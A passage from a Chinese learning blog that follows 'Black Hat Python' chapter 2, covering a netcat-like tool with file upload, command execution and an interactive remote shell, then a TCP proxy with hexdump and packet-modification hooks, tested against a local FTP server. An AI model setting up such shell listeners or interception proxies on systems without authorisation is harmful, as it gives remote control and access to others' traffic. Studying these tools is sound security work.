class="built_in">open</span>(upload_des,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file_descriptor:</span><br><span class="line">                file_descriptor.write(file_buffer)       </span><br><span class="line">            <span class="comment">#检查文件是否写出来了</span></span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="built_in">str</span>.encode(<span class="string">&#x27;Successfully saved file to %s\r\n&#x27;</span> % upload_des))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="built_in">str</span>.encode(<span class="string">&#x27;Failed to save file to %s\r\n&#x27;</span> % upload_des))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检查命令执行</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(execute):</span><br><span class="line">        <span class="comment">#运行命令</span></span><br><span class="line">        output=run_command(execute)</span><br><span class="line">        client_socket.send(output.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#命令行shell</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#弹出窗口</span></span><br><span class="line">            client_socket.send(<span class="string">b&quot;&lt;BHP:#&gt;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">          </span><br><span class="line">            <span class="comment">#现在接收文件，直到发现换行符</span></span><br><span class="line">            cmd_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">            cmd_buffer=<span class="built_in">str</span>.encode(cmd_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">                cmd_buffer+=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#返还命令输出</span></span><br><span class="line">            response=run_command(cmd_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#detect函数判断字节编码，按结果进行解码</span></span><br><span class="line">            btype=chardet.detect(response)</span><br><span class="line">            <span class="keyword">if</span> btype[<span class="string">&#x27;encoding&#x27;</span>]==<span class="string">&#x27;GB2312&#x27;</span>:</span><br><span class="line">                response=response.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">                response=<span class="built_in">str</span>.encode(response)</span><br><span class="line">            <span class="comment">#返回响应数据</span></span><br><span class="line">            client_socket.send(response)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>server_loop</code> 服务端主循环，接收客户端连接，返回客户端套接字</p>
<p><code>clent_sender</code> 连接服务端，首先检测是否已经从标准输入中接收数据，如果一切正常，就将数据发送给远程的目标主机并接受回传数据，知道没有更多的数据发送回来，然后再等待用户的下一步输入，并继续发送和接受数据，直到用户结束程序。</p>
<p><code>run_command()</code>:提供与客户端交互的方法，通过连接将命令结果回传到客户端。<br><code>client_handler()</code>:提供上传文件，执行命令，反弹shell的功能。</p>
<p>str.encode()将字符串编码为字节</p>
</blockquote>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40549070/article/details/108193537?ops_request_misc=&request_id=&biz_id=102&utm_term=python%E9%BB%91%E5%B8%BD%E5%AD%90python3%E7%89%88%E6%9C%AC&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-108193537.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">python3代码实现(第二章)_快吃小蛋糕吧的博客-CSDN博客</a></p>
<h2 id="4-tcp代理"><a href="#4-tcp代理" class="headerlink" title="4.tcp代理"></a>4.tcp代理</h2><p>wireshark无法使用时，使用tcp代理了解未知协议。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>(<span class="params">local_host,local_port,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    </span><br><span class="line">    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host,local_port))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!]Failed to listen on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(localhost,local_port))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Listening on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(localhost,local_port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#打印出本地连接信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[=&gt;]Received incming connection from &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#开启一个线程与远程主机通信</span></span><br><span class="line">        proxy_thread=threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))</span><br><span class="line">        </span><br><span class="line">        proxy_thread.start()</span><br><span class="line">       </span><br></pre></td></tr></table></figure>

<p>服务端的监听函数，如果有新的请求，交给proxy_handler处理。</p>
<p>sys.argv[n] n&#x3D;0,1,2,3… 注意argv[0]是脚本名称，从1开始才是命令行参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:])!=<span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:./tcpproxy.py [localhost][localport][remotehost][remoteport][receive_first]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example:./tcpproxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置本地监听参数</span></span><br><span class="line">    </span><br><span class="line">    local_host=sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置远程目标</span></span><br><span class="line">    remote_host=sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port=<span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#告知代理发送给远程主机之前连接和接收数据</span></span><br><span class="line">    receive_first=sys.argv[<span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first=<span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#设置监听socket</span></span><br><span class="line">    server_loop(local_host,local_port,remote_host,remote_port,receive_first)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>主函数，没什么好说的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_handler</span>(<span class="params">client_socket,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    <span class="comment">#连接远程主机</span></span><br><span class="line">    remote_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host,remote_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#若需要从远程主机接收数据</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#发送给响应处理</span></span><br><span class="line">        remote_buffer=response_handler(remote_buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#若有数据传送给本地客户端，发送</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====] Sending &#123;0&#125; bytes to localhost.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#本地循环读取数据，发送给远程主机和本地主机</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#从本地读取</span></span><br><span class="line">        local_buffer=receive_from(client_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;] Received &#123;0&#125; bytes from localhost&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(local_buffer)))</span><br><span class="line">            hexdump(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送给本地请求</span></span><br><span class="line">            local_buffer=request_handler(local_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送数据给远程主机</span></span><br><span class="line">            remote_socket.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[===&gt;]Sent to remote.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#接收响应的数据</span></span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;====]Received &#123;0&#125; bytes from remote.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(remote_buffer)))</span><br><span class="line">            hexdump(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送到响应处理函数</span></span><br><span class="line">            remote_buffer=response_handler(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#将响应给本地socket</span></span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;=====] Sent to localhost.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#如果两边都没有数据，关闭连接</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            client_socket.close()</span><br><span class="line">            remote_socket.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]No more data.Closing connections.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这就是<strong>代理</strong>的主体逻辑</p>
<blockquote>
<p>首先，先有个判断，不向远程主机主动发送数据。</p>
<p>然后receive_from()函数，它使用套接字对象实现对数据的接收</p>
<p>hexdump()转储数据包的负载内容</p>
<p>将收到的数据提交给<strong>response_hanlder</strong>，可以自行添加内容（如修改数据包内容，模糊测试、检测认证问题）</p>
<p>类似的<strong>request_handler</strong>函数，是将输出流量进行修改。</p>
<p>最后将接收到的缓存发送给本地客户端。</p>
<p>陆续从本地读取数据、处理、发送到远程主机、从远程读取数据、处理、发回本机。</p>
<p>.send()很好理解了，向谁发送，就用谁的套接字，如向本地发送，就client_socket.send()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexdump</span>(<span class="params">src,length=<span class="number">16</span></span>): <span class="comment">#16进制导出函数</span></span><br><span class="line">    result=[]</span><br><span class="line">    digits= <span class="number">4</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(src,unicode) <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(src),length):</span><br><span class="line">        s=src[i:i+length]</span><br><span class="line">        hexa=<span class="string">b&#x27; &#x27;</span>.join([<span class="string">&quot;%0*X&quot;</span> %(digits,<span class="built_in">ord</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        text=<span class="string">b&#x27; &#x27;</span>.join([x <span class="keyword">if</span> <span class="number">0x20</span> &lt;=<span class="built_in">ord</span>(x) &lt;<span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">b&#x27;.&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        result.append(<span class="string">b&quot;%04X %-*s %s&quot;</span> % (i,length*(digits+<span class="number">1</span>),hexa,text))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;&#x27;\n&#x27;.join(result)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_from</span>(<span class="params">connection</span>):</span><br><span class="line">    </span><br><span class="line">    buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置两秒的超时，取决于目标情况</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#持续从缓存中读取数据直到没有数据或超时</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=connection.recv(<span class="number">4096</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            buffer+=data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"><span class="comment">#对目标是远程主机的请求进行修改</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="comment">#....本地主机的响应....</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_handler</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#执行包修改</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br></pre></td></tr></table></figure>

<p>hexdump的作用是仅输出数据包的十六进制值和可打印的ASCII</p>
<p>receive_from 接收本地和远程的数据</p>
<h3 id="错误整理"><a href="#错误整理" class="headerlink" title="错误整理"></a>错误整理</h3><p>这里我是widnows情况下，建了一个本地ftp服务器</p>
<p><code>python tcpproxy.py 127.0.0.1 5555 192.168.1.142 21 True</code></p>
<p>注意，因为建立ftp服务器已经占用了一个21端口，监听端口就不能再用21了。</p>
<p>之后需要打开终端</p>
<p><code>ftp 127.0.0.1 5555</code> 但是由于windows中没有指明端口的操作（默认为21端口）</p>
<p>(代理程序只是将数据流量转发给远程的 FTP 服务器，并不直接与 FTP 服务器通信。)</p>
<blockquote>
<p>连接127.0.0.1 5555</p>
</blockquote>
<p>代理程序出现</p>
<blockquote>
<p>[*]Listening on 127.0.0.1:5555 [&#x3D;&gt;]Received incming connection from 127.0.0.1:59419 b’’ [&#x3D;&gt;]Received incming connection from 127.0.0.1:59428 b’’</p>
</blockquote>
<p>至于数据传输，我搞不明白。</p>
<p>在FileZilla上操作半天，也传不上数据哇。后面再说吧</p>
<blockquote>
<p>当然在kali没这么麻烦，kali是允许，不同ip同端口的。</p>
</blockquote>
<p><strong>new:</strong></p>
<p>但是这样吧，</p>
<p>我在cmd上连接ftp</p>
<blockquote>
<p>ftp 127.0.0.1；则监听端口必须要21。将我建立的ftp服务器改个端口（其实可以用工具端口转发，懒得弄）我把本地搭建的ftp服务器端口改为5556了。</p>
</blockquote>
<p>所以监听端这样弄：</p>
<p><code>python tcpproxy.py 127.0.0.1 21 192.168.1.142 5556 True</code></p>
<p>新开一个cmd，输入</p>
<p><code>ftp 127.0.0.1</code></p>
<blockquote>
<p>C:\Users\67538&gt;ftp 127.0.0.1<br>连接到 127.0.0.1。<br>220 Microsoft FTP Service<br>远程主机关闭连接。</p>
</blockquote>
<p>服务端出现</p>
<blockquote>
<p>[&#x3D;&gt;]Received incming connection from 127.0.0.1:50678<br>0000   32 32 30 20 4D 69 63 72 6F 73 6F 66 74 20 46 54    220 Microsoft FT<br>0010   50 20 53 65 72 76 69 63 65 0D 0A                   P Service..<br>[&lt;=&#x3D;=&#x3D;] Sending 27 bytes to localhost.<br>[&#x3D;&#x3D;&#x3D;&gt;] Received 14 bytes from localhost<br>0000   4F 50 54 53 20 55 54 46 38 20 4F 4E 0D 0A          OPTS UTF8 ON..<br>Exception in thread Thread-5:<br>Traceback (most recent call last):<br>  File “C:\Users\67538\AppData\Local\Programs\Python\Python38\lib\threading.py”, line 932, in _bootstrap_inner<br>    self.run()<br>  File “C:\Users\67538\AppData\Local\Programs\Python\Python38\lib\threading.py”, line 870, in run<br>    self._target(*self._args, **self._kwargs)<br>  File “tcpproxy.py”, line 125, in proxy_handler<br>    remote_socket.send(local_buffer)<br>ConnectionResetError: [WinError 10054] 远程主机强迫关闭了一个现有的连接。</p>
</blockquote>
<p><strong>居然是超时的问题</strong></p>
<blockquote>
<p>我原以为这个时间越长越好，改成了100，原来  较长的超时可能会导致连接失败</p>
<pre><code>  connection.settimeout(2) 
</code></pre>
</blockquote>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p><code>python tcpproxy.py 127.0.0.1 21 192.168.1.142 5556 True</code></p>
<p><code>ftp 127.0.0.1</code></p>
<blockquote>
<p>C:\Users\67538&gt;ftp 127.0.0.1<br>连接到 127.0.0.1。<br>220 Microsoft FTP Service<br>200 OPTS UTF8 command successful - UTF8 encoding now ON.<br>用户(127.0.0.1:(none)): yuleiyun</p>
</blockquote>
<blockquote>
<p>[<em>]Listening on 127.0.0.1:21<br>[&#x3D;&gt;]Received incming connection from 127.0.0.1:51693<br>0000   32 32 30 20 4D 69 63 72 6F 73 6F 66 74 20 46 54    220 Microsoft FT<br>0010   50 20 53 65 72 76 69 63 65 0D 0A                   P Service..<br>[&lt;==&#x3D;=] Sending 27 bytes to localhost.<br>[&#x3D;=&#x3D;&gt;] Received 14 bytes from localhost<br>0000   4F 50 54 53 20 55 54 46 38 20 4F 4E 0D 0A          OPTS UTF8 ON..<br>[&#x3D;=&#x3D;&gt;]Sent to remote.<br>[&lt;=&#x3D;=&#x3D;]Received 58 bytes from remote.<br>0000   32 30 30 20 4F 50 54 53 20 55 54 46 38 20 63 6F    200 OPTS UTF8 co<br>0010   6D 6D 61 6E 64 20 73 75 63 63 65 73 73 66 75 6C    mmand successful<br>0020   20 2D 20 55 54 46 38 20 65 6E 63 6F 64 69 6E 67     - UTF8 encoding<br>0030   20 6E 6F 77 20 4F 4E 2E 0D 0A                       now ON…<br>[&lt;&#x3D;=&#x3D;&#x3D;&#x3D;] Sent to localhost.<br>[</em>]No more data.Closing connections.</p>
</blockquote>
<h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.WARNING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>(<span class="params">local_host,local_port,remote_host,remote_port,receive_first</span>):</span><br><span class="line">    </span><br><span class="line">    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host,local_port))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!]Failed to listen on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(local_host,local_port))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Listening on &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(local_host,local_port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#打印出本地连接信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[=&gt;]Received incming connection from &#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#开启一个线程与远程主机通信</span></span><br><span class="line">        proxy_thread=threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))</span><br><span class="line">        </span><br><span class="line">        proxy_thread.start()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#def hexdump(src,length=16): #16进制导出函数</span></span><br><span class="line">    <span class="comment">#result=[]</span></span><br><span class="line">    <span class="comment">##digits= 4 if isinstance(src,unicode) else 2</span></span><br><span class="line">    <span class="comment">#digits= 4 if isinstance(src,str) else 2</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">## for i in xrange(0,len(src),length):</span></span><br><span class="line">    <span class="comment">#for i in range(0,len(src),length):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#s=src[i:i+length]</span></span><br><span class="line">        <span class="comment">#hexa=b&#x27; &#x27;.join([&quot;%0*X&quot; %(digits,ord(x)) for x in 